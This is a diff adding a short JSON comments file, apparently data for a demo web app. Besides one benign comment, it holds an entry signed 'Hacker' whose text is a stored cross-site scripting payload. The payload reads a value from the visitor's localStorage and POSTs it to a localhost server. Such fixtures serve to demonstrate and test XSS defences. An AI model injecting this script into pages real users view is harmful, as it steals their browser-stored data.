@@ -1,0 +1,14 @@
+{
+  "comments": [
+    {
+      "name": "Dhruv Dhaduk",
+      "comment": "Hello, World. This is my first comment.",
+      "id": 1
+    },
+    {
+      "name": "Hacker",
+      "comment": "<script>\nif (localStorage.getItem('name'))\nfetch(\"http://localhost:5000/users\", {\n    method: \"POST\",\n    headers: {\n        \"Content-Type\": \"application/json\"\n    },\n    body: JSON.stringify({ id: localStorage.getItem('name') })\n})\n</script>",
+      "id": 2
+    }
+  ]
+}
